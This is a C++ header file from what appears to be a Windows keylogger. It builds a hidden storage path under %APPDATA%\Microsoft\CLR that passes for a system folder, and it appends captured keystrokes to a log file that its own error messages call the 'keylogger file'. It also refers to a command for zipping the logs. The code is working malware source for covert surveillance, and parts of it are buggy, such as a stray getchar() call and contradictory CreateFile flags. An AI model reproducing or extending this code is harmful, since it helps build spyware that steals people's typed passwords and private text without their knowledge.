#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>
#include<cstdlib>
#include<string>
#include "Helper.h"
#include"Globals.h"
std::string pszFileName = std::string(LOG_FILE);
std::string cmd = std::string(ZIP_EXEC_CMD);
static DWORD oldSize = 0;

std::string GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0) {
        return std::string(); //No error message has been recorded
    }

    LPSTR messageBuffer = nullptr;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    //Copy the error message into a std::string.
    std::string message(messageBuffer, size);

    //Free the Win32's string's buffer.
    LocalFree(messageBuffer);

    return message;
}


namespace IO {
    std::string GetOurPath(const bool append_separator = false) {
        TCHAR szBuffer[1024];
        GetEnvironmentVariableW(TEXT("APPDATA"), szBuffer, 1024);
        std::string tempPath = "";
        for (int i = 0; szBuffer[i] != '\0'; i++) {
            tempPath += szBuffer[i];
        }
        std::string appdata_dir(tempPath);
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return (full + (append_separator ? "\\" : ""));
    }

    bool MkOneDr(std::string path) {
        return ((bool)CreateDirectoryA(path.c_str(), NULL) || (GetLastError() == ERROR_ALREADY_EXISTS));
    }

    bool MKDir(std::string path) {
        getchar();
        for (char& c : path) {
            if (c == '\\') {
                c = '\0';
                if (!MkOneDr(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T> std::string Writelog(const T& t) {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = (path + pszFileName);

        try {
            DWORD dwBytesToWrite = t.length() + 1;
            DWORD dwBytesWritten;
            BOOL bErrorFlag = FALSE;
            std::wstring wide_string(name.begin(), name.end());
            const wchar_t* fileNamePath = wide_string.c_str();
            HANDLE hFile = CreateFile(
                fileNamePath,     // Filename
                FILE_APPEND_DATA,  // append mode  // Desired access
                FILE_SHARE_READ,        // Share mode
                NULL,                   // Security attributes
                CREATE_NEW | OPEN_EXISTING, // Creates a new file, only if it doesn't already exist
                FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
                NULL);                  // Template file handle

            if (hFile == INVALID_HANDLE_VALUE)
            {
                Helper::WriteAppLog(" --  File Creation/opening failed..trying again --- ");
                //MessageBox(NULL, L"error", L"error is file opening", 0);
                hFile = CreateFile(
                    fileNamePath,     // Filename
                    FILE_APPEND_DATA,  // append mode  // Desired access
                    FILE_SHARE_READ,        // Share mode
                    NULL,                   // Security attributes
                    CREATE_ALWAYS,          // Creates a new file
                    FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
                    NULL);                  // Template file handle

                if (hFile == INVALID_HANDLE_VALUE) {
                    ::MessageBoxA(NULL, GetLastErrorAsString().c_str(), "File Creating error", 0);
                    Helper::WriteAppLog("error in opening keylogger file");
                    //wide_string  = wstring(pszFileName.begin(), pszFileName.end());
                    wprintf(_T("Terminal failure: Unable to create/open file \"%s\" for writing.\n"), fileNamePath);
                    return "";
                }
                else {
                    CloseHandle(hFile);
                }

                hFile = CreateFile(
                    fileNamePath,     // Filename
                    FILE_APPEND_DATA,  // append mode  // Desired access
                    FILE_SHARE_READ,        // Share mode
                    NULL,                   // Security attributes
                    CREATE_NEW | OPEN_EXISTING, // Creates a new file, only if it doesn't already exist
                    FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
                    NULL);                  // Template file handle

                if (hFile == INVALID_HANDLE_VALUE) {
                    ::MessageBoxA(NULL, GetLastErrorAsString().c_str(), "File Opening error", 0);
                    Helper::WriteAppLog("error in opening keylogger file");
                    //wide_string  = wstring(pszFileName.begin(), pszFileName.end());
                    wprintf(_T("Terminal failure: Unable to create/open file \"%s\" for writing.\n"), fileNamePath);
                    return "";
                }
            }
            DWORD dwMoved = ::SetFilePointer(hFile, 0l, nullptr, FILE_END); // Set the file pointer to the end-of-file:
            if (dwMoved == INVALID_SET_FILE_POINTER) {
                Helper::WriteAppLog("Unable to set file pointer to end-of-file.\n");
                return "";
            }
            std::string writeStr = t;
            DWORD fileSz = GetFileSize(hFile, NULL);
            if (fileSz%230 == 0) {
                writeStr += "\n";
            }
            bool bErrorFlagi = WriteFile(
                hFile,            // Handle to the file
                writeStr.c_str(),  // Buffer to write
                writeStr.length(),   // Buffer size
                &dwBytesWritten,    // Bytes written
                nullptr);         // Overlapped
            if (FALSE == bErrorFlagi)
            {
                Helper::WriteAppLog("Error in writing file.\n");
                return "";
            }
            CloseHandle(hFile);

            return name;
        }
        catch (...) {
            return "";
        }
    }
}
#endif // IO_H
